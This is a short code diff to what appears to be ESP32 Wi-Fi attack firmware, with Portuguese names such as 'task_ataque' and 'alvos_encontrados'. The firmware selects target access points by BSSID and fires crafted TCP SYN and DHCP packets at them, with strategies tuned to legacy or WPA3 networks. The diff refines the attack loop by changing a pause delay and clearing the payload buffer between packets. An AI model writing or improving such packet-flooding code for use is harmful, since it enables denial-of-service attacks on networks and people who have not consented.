@@ -343,7 +343,7 @@ void task_monitoramento(void *pvParameters) {
             else falhas_consecutivas = 0;
 
             if (falhas_consecutivas > 3 && !alvo_perdido.load()) {
-                scanner_pausa_ataque.store(true); vTaskDelay(pdMS_TO_TICKS(100));   
+                scanner_pausa_ataque.store(true); vTaskDelay(pdMS_TO_TICKS(250));   
                 
                 uint8_t mac_alvo[6]; memcpy(mac_alvo, alvos_encontrados[alvo_selecionado].bssid, 6);
                 esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
@@ -477,6 +477,7 @@ void task_ataque(void *pvParameters) {
                 int chance_dhcp    = (estrategia == ESTRATEGIA_LEGACY_CRITICA) ? 6 : (estrategia == ESTRATEGIA_WPA3_BLINDADO ? 1 : 2);  
 
                 for (int i = 0; i < 15; i++) { 
+                    memset(pkt->l4_and_payload, 0, sizeof(pkt->l4_and_payload));
                     int tipo_ataque = fast_rand() % 10;
                     bool is_tcp = (tipo_ataque < chance_tcp_syn); 
                     bool is_dhcp = (tipo_ataque >= chance_tcp_syn && tipo_ataque < (chance_tcp_syn + chance_dhcp));
